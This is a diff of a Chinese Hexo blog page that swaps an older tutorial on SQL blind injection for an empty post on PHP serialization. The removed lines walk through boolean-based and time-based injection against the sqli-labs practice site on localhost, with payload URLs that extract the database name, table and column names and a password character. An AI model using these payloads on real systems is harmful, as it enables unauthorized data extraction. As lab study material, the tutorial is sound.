@@ -15,23 +15,16 @@
 
 
 
-<meta name="description" content="简单介绍下sql盲注。">
+<meta name="description" content="做题却也不如你">
 <meta property="og:type" content="article">
-<meta property="og:title" content="sql盲注学习笔记">
-<meta property="og:url" content="https://clearloveqaq.github.io/2016/09/22/sql盲注学习笔记/index.html">
+<meta property="og:title" content="PHP序列化与反序列化">
+<meta property="og:url" content="https://clearloveqaq.github.io/2017/03/03/PHP序列化与反序列化/index.html">
 <meta property="og:site_name" content="Isron">
-<meta property="og:description" content="简单介绍下sql盲注。">
-<meta property="og:image" content="http://i2.buimg.com/567571/adbcf6108d98a116.png">
-<meta property="og:image" content="http://i2.buimg.com/567571/0734542cbac67246.png">
-<meta property="og:image" content="http://i2.buimg.com/567571/dc1637ce49349e12.png">
-<meta property="og:image" content="http://i2.buimg.com/567571/d4cfd4d6aacac9bf.png">
-<meta property="og:image" content="http://i2.buimg.com/567571/4fc7359cac8331a2.png">
-<meta property="og:image" content="http://i2.buimg.com/567571/3df977775740cbf4.png">
-<meta property="og:updated_time" content="2016-10-15T14:56:55.609Z">
+<meta property="og:description" content="做题却也不如你">
+<meta property="og:updated_time" content="2017-03-03T02:57:17.244Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="sql盲注学习笔记">
-<meta name="twitter:description" content="简单介绍下sql盲注。">
-<meta name="twitter:image" content="http://i2.buimg.com/567571/adbcf6108d98a116.png">
+<meta name="twitter:title" content="PHP序列化与反序列化">
+<meta name="twitter:description" content="做题却也不如你">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -63,7 +56,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>sql盲注学习笔记 | Isron</title>
+<title>PHP序列化与反序列化 | Isron</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -279,11 +272,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-sql盲注学习笔记" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="w-PHP序列化与反序列化" class="article article-type-w" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2016/09/22/sql盲注学习笔记/" class="article-date">
-      <time datetime="2016-09-22T01:52:17.000Z" itemprop="datePublished">2016-09-22</time>
+      <a href="/2017/03/03/PHP序列化与反序列化/" class="article-date">
+      <time datetime="2017-03-03T02:57:17.000Z" itemprop="datePublished">2017-03-03</time>
 </a>
 
 
@@ -298,7 +291,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      sql盲注学习笔记
+      PHP序列化与反序列化
     </h1>
   
 
@@ -308,10 +301,6 @@
         
 
         
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL/">SQL</a></li></ul>
-    </div>
-
         <div class="clearfix"></div>
       </div>
       
@@ -319,44 +308,7 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>简单介绍下sql盲注。<br><a id="more"></a></p>
-<h2 id="sql注入之盲注"><a href="#sql注入之盲注" class="headerlink" title="sql注入之盲注"></a>sql注入之盲注</h2><p>　　盲注其实是sql注入的一种，之所以称为盲注是因为他不会根据你sql注入的攻击语句返回你想要知道的错误信息。<br>　　盲注分为两类：<br>   　　　　1.布尔盲注　布尔很明显Ture跟Fales，也就是说它只会根据　　　　你的注入信息返回Ture跟Fales，也就没有了之前的报错信息。<br>　　　　2.时间盲注　界面返回值只有一种,true 无论输入任何值 返回情况都会按正常的来处理。加入特定的时间函数，通过查看web页面返回的时间差来判断注入的语句是否正确。<br>　　需要用到的函数：</p>
-<pre><code>Length（）函数 返回字符串的长度
-Substr（）截取字符串
-Ascii（）返回字符的ascii码
-sleep(n)：将程序挂起一段时间 n为n秒
-if(expr1,expr2,expr3):判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句
-</code></pre><p>　　先在mysql里测试下这几个函数：<br>　　　　这里使用的是security库<br>length函数：<br><img src="http://i2.buimg.com/567571/adbcf6108d98a116.png" alt=""><br>substr函数：<br><img src="http://i2.buimg.com/567571/0734542cbac67246.png" alt=""><br>Ascii：<br><img src="http://i2.buimg.com/567571/dc1637ce49349e12.png" alt=""><br>sleep跟if由于是时间盲注就不一一测试了。</p>
-<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>sqli-less-8为布尔盲注这里就用它做下测试<br>　　刚开始用id=1’/  ’)  “ 测试了一下发现不会爆出错误信息 只有正确跟错误 less-8应该就是布尔盲注了吧  然后通过上面的函数首先构造一个猜测数据库名长度的函数</p>
-<pre><code>http://127.0.0.1/Less-8/?id=1&apos;and (length(database()))&gt;10 --+
-</code></pre><p><img src="http://i2.buimg.com/567571/d4cfd4d6aacac9bf.png" alt=""><br>返回错误 说明length小于10<br>然后继续猜测是不是大于5</p>
-<pre><code>http://127.0.0.1/Less-8/?id=1&apos; and (length(database()))&gt;5 --+
-</code></pre><p><img src="http://i2.buimg.com/567571/4fc7359cac8331a2.png" alt=""><br>返回正确说明长度大于5小于10<br>最后得到结果为</p>
-<pre><code>http://127.0.0.1/Less-8/?id=1&apos; and (length(database()))=8 --+
-</code></pre><p><img src="http://i2.buimg.com/567571/3df977775740cbf4.png" alt=""><br>返回正确 长度为八 也就是security<br>接下来利用substr函数与ascii函数构造猜测数据库名ascii码的值的语句 因为现在只知道长度不知道具体内容<br>构造语句如下</p>
-<pre><code>http://127.0.0.1/Less-8/?id=1&apos; and (ascii(substr(database(),1,1)))&gt;100 --+
-</code></pre><p>返回正确说明第一个字母的ascii码大于100</p>
-<pre><code>http://127.0.0.1/Less-8/?id=1&apos; and (ascii(substr(database(),1,1)))&gt;110 --+
-</code></pre><p>返回正确 </p>
-<pre><code>http://127.0.0.1/Less-8/?id=1&apos; and (ascii(substr(database(),1,1)))&lt;120 --+
-</code></pre><p>返回正确</p>
-<pre><code>http://127.0.0.1/Less-8/?id=1&apos; and (ascii(substr(database(),1,1)))&lt;115 --+
-</code></pre><p>返回错误</p>
-<pre><code>http://127.0.0.1/Less-8/?id=1&apos; and (ascii(substr(database(),1,1)))=115 --+
-</code></pre><p>返回正确 通过查ascii码表可知 ascii（115）=s 也就是security 的第一个字母<br>通过改变database（）后面的数字 可以继续猜测第二个字母第三个字母<br>接下来改变语句去猜测表名<br>构造这个语句的时候发现自己还是不够熟练 弄错了好几次</p>
-<pre><code>http://127.0.0.1/Less-8/?id=1&apos; and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&gt;100 --+
-</code></pre><p>返回正确 当等于101的时候返回正确 101为 e 查看mysql 得知第一个表为emails 正确结果 </p>
-<pre><code>http://127.0.0.1/Less-8/?id=1&apos; and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)))=114 --+
-</code></pre><p>猜测列名只需要改变几个地方</p>
-<pre><code>http://127.0.0.1/Less-8/?id=1&apos; and (ascii(substr((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1),1,1)))&gt;100 --+
-</code></pre><p>获取user表的内容 经过猜测 ascii为 105  为i  也就是表的第一个列名 id的第一个字母 同样 通过修改 limit 0,1 获取第二个列名 修改后面1,1的获取当前列的其他字段<br>接着获取 username 与 password 里面的内容 因为知道了列名所以直接 select password from users 就可以获取password里面的内容 username一样<br>具体语句如下</p>
-<pre><code>http://127.0.0.1/Less-8/?id=1&apos; and (ascii(substr(( select password from users limit 0,1),1,1)))=68--+  
-</code></pre><p>ascii(68)=D  正确<br>手工盲注很繁琐 需要一个一个的试 不过现在还是先学习手工理解了sql注入的原理再去用工具比较好</p>
-<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>sqli-less-9为时间盲注<br>前面已经说过slee（）函数跟if函数了<br>这里就直接构造如下语句</p>
-<pre><code>http://127.0.0.1/Less-9/?id=1&apos; and (if(ascii(substr(database(),1,1))&gt;100,sleep(10),null))  --+ 
-</code></pre><p>如果返回正确则 页面会停顿10秒，返回错误则会立马返回<br>其他与布尔盲注都是差不多的</p>
-<h3 id="post类的布尔盲注与时间盲注"><a href="#post类的布尔盲注与时间盲注" class="headerlink" title="post类的布尔盲注与时间盲注"></a>post类的布尔盲注与时间盲注</h3><p>　　前面说的都是get类的盲注，post类的布尔盲注只是把and换成or其他不变，时间盲注有些不同因为在post类里sleep函数会被放大很多也就是说那个延时时间会很长，不过并不影响我们进行测试。</p>
-
+        
       
     </div>
     
@@ -364,13 +316,13 @@ if(expr1,expr2,expr3):判断语句 如果第一个语句正确就执行第二个
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2016/09/22/sql盲注学习笔记/">sql盲注学习笔记</a></p>
+        <p><span>本文标题:</span><a href="/2017/03/03/PHP序列化与反序列化/">PHP序列化与反序列化</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">Isron</a></p>
-        <p><span>发布时间:</span>2016-09-22, 09:52:17</p>
-        <p><span>最后更新:</span>2016-10-15, 22:56:55</p>
+        <p><span>发布时间:</span>2017-03-03, 10:57:17</p>
+        <p><span>最后更新:</span>2017-03-03, 10:57:17</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2016/09/22/sql盲注学习笔记/" title="sql盲注学习笔记">https://clearloveqaq.github.io/2016/09/22/sql盲注学习笔记/</a>
-            <span class="copy-path" data-clipboard-text="原文: https://clearloveqaq.github.io/2016/09/22/sql盲注学习笔记/　　作者: Isron" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2017/03/03/PHP序列化与反序列化/" title="PHP序列化与反序列化">https://clearloveqaq.github.io/2017/03/03/PHP序列化与反序列化/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://clearloveqaq.github.io/2017/03/03/PHP序列化与反序列化/　　作者: Isron" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -382,12 +334,12 @@ if(expr1,expr2,expr3):判断语句 如果第一个语句正确就执行第二个
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2016/10/15/sql绕过技巧/">
-                    sql绕过技巧
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2017/03/01/Jarvis-OJ-神盾局的秘密/">
+                    Jarvis OJ 神盾局的秘密
                 </a>
             </div>
-        
         
     </nav>
 
@@ -397,7 +349,7 @@ if(expr1,expr2,expr3):判断语句 如果第一个语句正确就执行第二个
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#sql注入之盲注"><span class="toc-number">1.</span> <span class="toc-text">sql注入之盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#布尔盲注"><span class="toc-number">1.1.</span> <span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#时间盲注"><span class="toc-number">1.2.</span> <span class="toc-text">时间盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#post类的布尔盲注与时间盲注"><span class="toc-number">1.3.</span> <span class="toc-text">post类的布尔盲注与时间盲注</span></a></li></ol></li></ol>
+            
         
     </div>
     <style>
@@ -437,7 +389,7 @@ if(expr1,expr2,expr3):判断语句 如果第一个语句正确就执行第二个
     
       <div class="duoshuo" id="comments">
     <div id="comment-box" ></div>
-    <div class="ds-thread" id="ds-thread" data-thread-key="2016/09/22/sql盲注学习笔记/" data-title="sql盲注学习笔记" data-url="https://clearloveqaq.github.io/2016/09/22/sql盲注学习笔记/"></div>
+    <div class="ds-thread" id="ds-thread" data-thread-key="2017/03/03/PHP序列化与反序列化/" data-title="PHP序列化与反序列化" data-url="https://clearloveqaq.github.io/2017/03/03/PHP序列化与反序列化/"></div>
     <script>
         var duoshuoQuery = {short_name:"clearloveqaq"};
         var loadComment = function(){
@@ -460,15 +412,15 @@ if(expr1,expr2,expr3):判断语句 如果第一个语句正确就执行第二个
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2016/10/15/sql绕过技巧/" title="上一篇: sql绕过技巧">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+            <a href="/2017/03/01/Jarvis-OJ-神盾局的秘密/" title="下一篇: Jarvis OJ 神盾局的秘密">
+                <i class="fa fa-angle-right"></i>
+            </a>
         
     </div>
 
